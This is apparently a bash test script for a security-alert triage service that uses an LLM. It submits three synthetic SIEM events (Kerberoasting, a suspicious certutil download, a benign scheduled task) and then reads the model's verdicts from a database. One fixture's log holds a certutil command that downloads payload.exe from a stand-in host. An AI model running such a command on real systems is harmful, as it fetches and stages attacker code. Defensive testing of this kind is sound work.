#!/bin/bash
set -e
API="http://localhost:8090"
TK=$(curl -s -X POST $API/api/v1/auth/login -H "Content-Type: application/json" -d '{"email":"admin@test.local","password":"TestPass2026"}' | sed 's/.*"token":"\([^"]*\)".*/\1/')

echo "=== Submitting 3 tasks ==="

# 1. Kerberoasting
T1=$(curl -s -X POST $API/api/v1/tasks -H "Authorization: Bearer $TK" -H "Content-Type: application/json" \
  -d '{"task_type":"credential_access","input":{"prompt":"Investigate Kerberoasting attempt","severity":"high","siem_event":{"title":"Kerberoasting - SPN Enumeration","source_ip":"10.0.1.45","username":"jsmith","rule_name":"T1558.003","raw_log":"EventID=4769 ServiceName=MSSQLSvc/dbserver.corp.local TicketEncryptionType=0x17 ClientAddress=10.0.1.45 User=jsmith RC4_DOWNGRADE=true RequestCount=47 TimeWindow=120s"}}}' | sed 's/.*"task_id":"\([^"]*\)".*/\1/')
echo "Kerberoasting: $T1"

sleep 3

# 2. LOLBins
T2=$(curl -s -X POST $API/api/v1/tasks -H "Authorization: Bearer $TK" -H "Content-Type: application/json" \
  -d '{"task_type":"execution","input":{"prompt":"Investigate LOLBins execution","severity":"high","siem_event":{"title":"Suspicious certutil usage","source_ip":"10.0.2.11","username":"admin","rule_name":"T1105","raw_log":"Process=certutil.exe Args=-urlcache -split -f http://192.168.1.200/payload.exe ParentProcess=cmd.exe User=CORP/admin Host=WS-LEGAL-07"}}}' | sed 's/.*"task_id":"\([^"]*\)".*/\1/')
echo "LOLBins: $T2"

sleep 3

# 3. Benign
T3=$(curl -s -X POST $API/api/v1/tasks -H "Authorization: Bearer $TK" -H "Content-Type: application/json" \
  -d '{"task_type":"system_event","input":{"prompt":"Investigate scheduled task execution","severity":"low","siem_event":{"title":"Scheduled Task - Windows Update","source_ip":"10.0.0.5","username":"SYSTEM","rule_name":"ScheduledTask","raw_log":"TaskName=WindowsUpdate Scheduler=SYSTEM Host=WS-HR-01 Status=Success"}}}' | sed 's/.*"task_id":"\([^"]*\)".*/\1/')
echo "Benign: $T3"

echo ""
echo "=== Waiting 180s for LLM inference ==="
sleep 180

echo ""
echo "=== RESULTS ==="
docker compose exec -T postgres psql -U zovark -d zovark -c \
"SELECT output->>'verdict' as verdict, (output->>'risk_score')::int as risk, jsonb_array_length(COALESCE(output->'iocs','[]'::jsonb)) as iocs, status, left(input->>'prompt',40) as task FROM agent_tasks ORDER BY created_at DESC LIMIT 3;"
